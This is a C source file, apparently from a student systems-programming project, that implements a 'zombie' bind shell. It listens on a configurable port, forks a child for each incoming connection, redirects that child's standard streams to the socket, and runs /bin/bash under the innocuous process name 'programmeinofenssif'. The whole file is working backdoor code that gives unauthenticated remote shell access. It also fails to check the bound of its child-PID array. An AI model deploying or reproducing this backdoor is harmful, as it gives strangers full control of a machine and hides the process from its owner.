#include "utils_v2.h"
#include "network.h"
#include "zombie.h"
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <string.h>



#define MAX_CHILDREN 10


static void openshel(void *clientSocket) {
	int *ptr = (int *)clientSocket;
	int acceptedConn = *ptr;

	dup2(acceptedConn, STDIN_FILENO);
	dup2(acceptedConn, STDOUT_FILENO);
	dup2(acceptedConn, STDERR_FILENO);

	sexecl("/bin/bash", "programmeinofenssif", (char*)NULL);
	
	
}





int main(int argc, char const *argv[])
{
    pid_t childPids[MAX_CHILDREN];
    int numChildren = 0;

	int ports[] = PORTS_LIST;
	int taillePortsList =(sizeof(ports) / sizeof(ports[0]));

	int port=-1;
	if (argc > 1) {
		int portToConnect = atoi(argv[1]);
		for(int i=0; i < taillePortsList; i++){
			if(portToConnect == ports[i]){
				port = portToConnect;
				break;
			}
		}
		if(port == -1){
			checkNeg(-1,"This port is not contained in the port list\n");
		}
	}

	int socketf = initSocketServer(port);
	
	// setsockopt -> to avoid Address Already in Use
	int option = 1;
	setsockopt(socketf, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(int));
    
    ssigaction(SIGINT, ehandler);
	while(1){
		int acceptedConn = accept(socketf, NULL, NULL);
		if(acceptedConn != -1 ) {
			printf("New connexion accepted\n");
			pid_t childPid = fork_and_run1(openshel,(void*)&acceptedConn);
			childPids[numChildren] = childPid;
	        numChildren++;
            continue;
	    }
	    else{
            for (int i = 0; i < numChildren; i++) {
                skill(childPids[i], SIGINT);
            }
	    	sclose(socketf);
	    	break;
    	}
    }

    return 0;
}

